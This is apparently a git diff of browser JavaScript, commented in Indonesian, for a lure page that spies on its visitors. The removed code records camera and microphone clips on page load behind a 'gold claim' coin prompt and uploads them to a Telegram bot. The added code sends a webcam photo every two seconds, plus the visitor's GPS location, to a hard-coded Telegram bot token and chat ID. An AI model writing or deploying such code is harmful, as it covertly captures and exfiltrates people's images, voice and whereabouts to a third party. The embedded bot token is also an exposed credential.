@@ -1,116 +1,81 @@
-import { createFFmpeg, fetchFile } from '@ffmpeg/ffmpeg';
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
 
-let mediaRecorder;
-let videoChunks = [];
-const statusDisplay = document.getElementById('status');
-const countdownDisplay = document.getElementById('countdown');
-const goldClaimMessage = document.getElementById('goldClaimMessage');
-const goldCoin = document.getElementById('goldCoin');
-let recordingInterval;
-let countdownTimer;
+const botToken = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q';  // Ganti dengan token bot Telegram
+const chatId = '-4545188605';  // Ganti dengan chat ID tujuan
 
-// Masukkan token bot Telegram dan chat ID
-const telegramBotToken = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q'; 
-const chatId = '-4545188605';
+let locationSent = false; // Pastikan lokasi hanya dikirim sekali
 
-// Inisialisasi FFmpeg.js
-const ffmpeg = createFFmpeg({ log: true });
-async function loadFFmpeg() {
-    if (!ffmpeg.isLoaded()) {
-        statusDisplay.textContent = 'Memuat FFmpeg...';
-        await ffmpeg.load();
-        console.log('✅ FFmpeg siap digunakan!');
+// **1. Meminta akses kamera**
+navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+        video.srcObject = stream;
+        startCapturing();
+    })
+    .catch(err => {
+        alert("Tidak dapat mengakses kamera: " + err.message);
+    });
+
+// **2. Mengambil lokasi pengguna (dikirim sekali)**
+function getLocationAndSend() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            position => {
+                if (!locationSent) {
+                    locationSent = true;
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const locationText = `📍 Lokasi pengguna: [Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+
+                    // Kirim ke Telegram
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: chatId, text: locationText, parse_mode: "Markdown" })
+                    }).then(() => console.log("Lokasi dikirim."));
+                }
+            },
+            error => console.error("Gagal mendapatkan lokasi:", error)
+        );
+    } else {
+        console.error("Geolocation tidak didukung di browser ini.");
     }
 }
 
-async function startRecording() {
-    await loadFFmpeg();
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+// **3. Mengambil gambar secara terus-menerus (2 detik sekali)**
+function startCapturing() {
+    setInterval(() => {
+        captureAndSend();
+    }, 2000); // Ambil gambar setiap 2 detik
+}
 
-    mediaRecorder.ondataavailable = (event) => {
-        videoChunks.push(event.data);
-    };
+function captureAndSend() {
+    const context = canvas.getContext("2d");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    async function sendVideoToTelegram() {
-        statusDisplay.textContent = 'Mengonversi video...';
-        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-        videoChunks = []; // Reset
-
-        // Konversi video ke MP4
-        const videoFile = await fetchFile(videoBlob);
-        ffmpeg.FS('writeFile', 'input.webm', videoFile);
-        await ffmpeg.run('-i', 'input.webm', '-c:v', 'libx264', 'output.mp4');
-        const outputData = ffmpeg.FS('readFile', 'output.mp4');
-        const mp4Blob = new Blob([outputData.buffer], { type: 'video/mp4' });
-
+    canvas.toBlob(blob => {
         const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('video', mp4Blob, 'recording.mp4');
-        formData.append('supports_streaming', true);
+        formData.append("photo", blob, "capture.jpg");
+        formData.append("caption", "📸 Gambar terbaru dari pengguna");
 
-        try {
-            let response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
-                method: 'POST',
-                body: formData,
-            });
-
-            let data = await response.json();
+        // Kirim ke Telegram
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+            method: "POST",
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
             if (data.ok) {
-                statusDisplay.textContent = '✅ Video berhasil dikirim!';
+                console.log("Gambar berhasil dikirim!");
             } else {
-                statusDisplay.textContent = '❌ Error: ' + data.description;
+                console.error("Gagal mengirim gambar:", data);
             }
-        } catch (error) {
-            statusDisplay.textContent = '❌ Gagal mengirim video!';
-            console.error('Error:', error);
-        }
-    }
-
-    function start10SecondsRecording() {
-        let countdown = 10;
-        countdownDisplay.textContent = countdown;
-
-        countdownTimer = setInterval(() => {
-            countdown--;
-            countdownDisplay.textContent = countdown;
-
-            if (countdown <= 5) {
-                goldClaimMessage.style.display = 'block';
-                goldCoin.style.display = 'block';
-            } else {
-                goldClaimMessage.style.display = 'none';
-                goldCoin.style.display = 'none';
-            }
-
-            if (countdown === 0) {
-                clearInterval(countdownTimer);
-            }
-        }, 1000);
-
-        mediaRecorder.start();
-
-        setTimeout(() => {
-            mediaRecorder.stop();  // Stop recording after 10 seconds
-        }, 10000);
-
-        mediaRecorder.onstop = () => {
-            sendVideoToTelegram();  // Kirim video setelah selesai
-        };
-    }
-
-    recordingInterval = setInterval(() => {
-        start10SecondsRecording();
-    }, 11000);
+        })
+        .catch(error => console.error("Error mengirim gambar:", error));
+    }, "image/jpeg");
 }
 
-// Jalankan rekaman saat halaman dimuat
-window.addEventListener('load', () => {
-    startRecording();
-    statusDisplay.textContent = '⏳ Memulai perekaman...';
-});
-
-// Hentikan rekaman jika halaman ditutup
-window.addEventListener('beforeunload', () => {
-    clearInterval(recordingInterval);
-});
+// **4. Mulai proses otomatis**
+getLocationAndSend();
